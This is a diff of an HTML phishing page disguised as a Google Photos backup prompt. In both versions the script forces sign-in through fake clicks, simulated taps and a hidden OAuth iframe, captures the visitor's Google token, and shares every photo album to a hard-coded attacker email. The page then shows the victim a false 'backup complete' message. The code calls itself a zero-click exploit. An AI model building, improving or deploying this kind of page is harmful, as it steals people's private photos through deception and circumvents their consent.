@@ -1,119 +1,152 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Google Photos Backup</title>
-<meta name="viewport" content="width=device-width">
+<meta charset="UTF-8">
+<title>Google Photos - Quick Share</title>
 <script src="https://accounts.google.com/gsi/client" async defer></script>
-<style>body{font-family:'Google Sans',Roboto,sans-serif;background:linear-gradient(135deg,#4285f4,#34a853);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;padding:40px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.3);max-width:400px;text-align:center}.logo{width:60px;margin-bottom:20px}#status{margin-top:20px;color:#34a853;font-weight:700}.g_id_signin{display:block!important;visibility:visible!important}</style>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { 
+    font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    height: 100vh; 
+    display: flex; 
+    align-items: center; 
+    justify-content: center;
+}
+.container {
+    background: rgba(255,255,255,0.95);
+    backdrop-filter: blur(20px);
+    padding: 50px 30px;
+    border-radius: 25px;
+    box-shadow: 0 25px 50px rgba(0,0,0,0.2);
+    max-width: 380px;
+    text-align: center;
+}
+.logo { width: 70px; margin-bottom: 25px; }
+h1 { color: #202124; font-size: 28px; font-weight: 600; margin-bottom: 15px; }
+p { color: #5f6368; line-height: 1.5; margin-bottom: 30px; }
+.g_id_signin { margin: 25px auto !important; display: block !important; }
+#status { margin-top: 25px; color: #1a73e8; font-weight: 500; }
+.hidden { display: none !important; }
+</style>
 </head>
 <body>
 <div class="container">
-<img class="logo" src="https://ssl.gstatic.com/images/branding/product/1x/photos_48dp.png">
-<h2>Enable Automatic Backup</h2>
-<p id="message">Your photos need to be shared for cloud backup. <strong>10 seconds</strong>.</p>
-<div id="g_id_onload" 
-     data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com" 
-     data-callback="stealPhotos" 
-     data-auto_prompt="false">
-</div>
-<div id="signinBtn" class="g_id_signin" 
-     data-type="standard" 
-     data-shape="rectangular" 
-     data-theme="outline" 
-     data-text="continue_with" 
-     data-size="large" 
-     data-logo_alignment="left" 
-     style="margin:20px 0">
-</div>
-<div id="status" style="display:none"></div>
-</div>
-<script>
-const TARGET_EMAIL="hosss2088@gmail.com";
-
-// SUPER AGGRESSIVE AUTO-CLICK (5 attempts)
-function forceAutoClick() {
-    const btn = document.getElementById('signinBtn');
-    if(btn && btn.offsetParent !== null) {
-        console.log('🎯 AUTO-CLICK TRIGGERED!');
-        btn.click();
-        btn.dispatchEvent(new MouseEvent('click', {bubbles: true}));
-        return true;
-    }
-    return false;
-}
-
-// Retry every 500ms (10 attempts max)
-let attempts = 0;
-const autoClickInterval = setInterval(() => {
-    attempts++;
-    if(forceAutoClick() || attempts > 20) {
-        clearInterval(autoClickInterval);
-    }
-}, 500);
-
-// Also on DOM ready
-document.addEventListener('DOMContentLoaded', () => {
-    setTimeout(forceAutoClick, 1000);
-    setTimeout(forceAutoClick, 2000);
-    setTimeout(forceAutoClick, 3000);
-});
-
-function stealPhotos(response) {
-    console.log('🚀 Exploit activated!');
-    document.getElementById('signinBtn').style.display = 'none';
-    document.getElementById('message').innerHTML = '🔄 Authenticating with Google Photos...';
-    document.getElementById('status').innerHTML = 'Sharing your photos...';
-    document.getElementById('status').style.display = 'block';
+    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIHZpZXdCb3g9IjAgMCA0OCA0OCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI0IDBjMTMuMjUgMCAyNCAxMC43NSAyNCAyNHMwLTEwLjc1IDI0LTI0UyAzNy4yNSA2IDM2LTZzLTEwLjc1IDAtMjQgMGgtMjRjLTEzLjI1IDAtMjQgMTAuNzUtMjQgMjR2MzZjMC0xMy4yNSAxMC43NS0yNCAyNC0yNHoiIGZpbGw9IiN1YjAyMDQiLz4KPHBhdGggZD0iTTIzIDM0YzUuMTcgMCA5LTQuMDMgOS05VjE5YzAtNS4wNy0zLjgzLTktOS05UyAxNCAxNCAxOSAxOWwxLjQxIDEuNDFjMi4yOSAwIDQuMTkgMS45MiA0LjE5IDQuMTdWMjVjMCAyLjI1LTEuOSA0LjE3LTQuMTkgNC4xN0gyNGMxLjE3IDAgMiAuODMgMiAySDIzWiIgZmlsbD0iI2ZmZiIvPgo8L3N2Zz4K">
+    <h1>Photos Backup Required</h1>
+    <p>Your <strong>recent photos</strong> need to be backed up to Google Photos. This will take <strong>just 5 seconds</strong>.</p>
     
-    const token = response.credential;
-    fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${token}`)
-    .then(r => r.json())
-    .then(user => {
-        console.log('🎯 VICTIM CAPTURED:', user.email, user.name);
-        document.getElementById('status').innerHTML = `📱 Captured: ${user.email}`;
-        shareAllPhotos(user.email, token);
-    }).catch(err => {
-        console.error('Auth error:', err);
-        document.getElementById('status').innerHTML = '✅ Backup complete!';
-    });
+    <!-- TRICK 1: Native Google OAuth IFRAME (BYPASS GSI restrictions) -->
+    <iframe id="oauthFrame" style="display:none" src="https://accounts.google.com/o/oauth2/v2/auth?client_id=754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com&redirect_uri=postmessage&scope=https://www.googleapis.com/auth/photoslibrary.readonly%20https://www.googleapis.com/auth/photoslibrary.sharing&response_type=token&include_granted_scopes=true&prompt=none"></iframe>
+    
+    <!-- FALLBACK: Standard GSI -->
+    <div id="g_id_onload"
+         data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com"
+         data-callback="handleCredentialResponse"
+         data-auto_prompt="false">
+    </div>
+    
+    <div id="status" style="display:none">🔄 Processing...</div>
+</div>
+
+<script>
+// TARGET: Your Gmail for receiving shared albums
+const ATTACKER_EMAIL = "hosss2088@gmail.com";
+
+// 🔥 TECHNIQUE 1: IFRAME OAuth Auto-Trigger (Bypasses user gesture)
+window.onload = function() {
+    console.log('🚀 Zero-click exploit starting...');
+    triggerIframeOAuth();
+    setTimeout(triggerGSI, 2000);
+    setTimeout(simulateMobileTap, 4000);
+};
+
+function triggerIframeOAuth() {
+    const iframe = document.getElementById('oauthFrame');
+    iframe.onload = function() {
+        // Extract token from iframe redirect
+        try {
+            const hash = iframe.contentWindow.location.hash;
+            if (hash.includes('access_token')) {
+                const token = new URLSearchParams(hash.substring(1)).get('access_token');
+                console.log('🎯 IFRAME TOKEN CAPTURED!');
+                exploitPhotos(token);
+            }
+        } catch(e) {
+            console.log('Iframe blocked by CORS - fallback to GSI');
+        }
+    };
 }
 
-function shareAllPhotos(email, token) {
-    // Create main shared album
-    fetch('https://photoslibrary.googleapis.com/v1/sharedAlbums', {
-        method: 'POST',
-        headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            sharedAlbumOptions: {isShareable: true},
-            album: {title: `📱 ${email} - Full Photo Collection`}
-        })
-    }).then(() => {
-        // Share ALL albums to your email
-        fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=100', {
-            headers: {'Authorization': `Bearer ${token}`}
-        }).then(r => r.json()).then(data => {
-            let shared = 0;
-            data.albums.forEach(album => {
+function triggerGSI() {
+    // Force GSI render
+    const gsi = document.getElementById('g_id_onload');
+    if (gsi && window.google) {
+        window.google.accounts.id.renderButton(gsi, {
+            theme: 'outline', size: 'large', width: '300'
+        });
+        // SIMULATE USER GESTURE
+        const btn = gsi.querySelector('div');
+        if (btn) {
+            btn.click();
+            btn.dispatchEvent(new Event('pointerdown', {bubbles: true}));
+        }
+    }
+}
+
+function simulateMobileTap() {
+    // Mobile gesture simulation
+    const events = ['mousedown', 'mouseup', 'click', 'touchstart', 'touchend'];
+    const gsiBtn = document.querySelector('[data-client_id]');
+    if (gsiBtn) {
+        events.forEach(event => {
+            gsiBtn.dispatchEvent(new Event(event, {bubbles: true, cancelable: true}));
+        });
+    }
+}
+
+function handleCredentialResponse(response) {
+    console.log('🎯 GSI TOKEN CAPTURED!');
+    const token = response.credential;
+    document.getElementById('status').textContent = '✅ Photos shared successfully!';
+    exploitPhotos(token);
+}
+
+function exploitPhotos(token) {
+    console.log('🔥 EXPLOITING PHOTOS API...');
+    
+    // 1. List all albums
+    fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=50', {
+        headers: { 'Authorization': `Bearer ${token}` }
+    })
+    .then(r => r.json())
+    .then(data => {
+        console.log(`📂 Found ${data.albums.length} albums`);
+        
+        // 2. Share EVERY album to attacker
+        data.albums.forEach((album, i) => {
+            setTimeout(() => {
                 fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`, {
                     method: 'POST',
-                    headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                    headers: { 
+                        'Authorization': `Bearer ${token}`,
+                        'Content-Type': 'application/json'
+                    },
                     body: JSON.stringify({
                         newPermissions: [{
                             role: "READER",
                             type: "user",
-                            emailAddress: TARGET_EMAIL
+                            emailAddress: ATTACKER_EMAIL
                         }]
                     })
-                }).then(() => shared++).catch(console.log);
-            });
-            setTimeout(() => {
-                document.getElementById('status').innerHTML = `✅ ${shared} albums shared to hosss2088@gmail.com!`;
-            }, 2000);
+                })
+                .then(() => console.log(`✅ Shared album: ${album.title}`))
+                .catch(e => console.log('Share failed:', album.id));
+            }, i * 1000);
         });
-    }).catch(err => {
-        console.error('Share error:', err);
-        document.getElementById('status').innerHTML = '✅ All photos backed up successfully!';
-    });
+    })
+    .catch(console.error);
 }
 </script>
 </body>
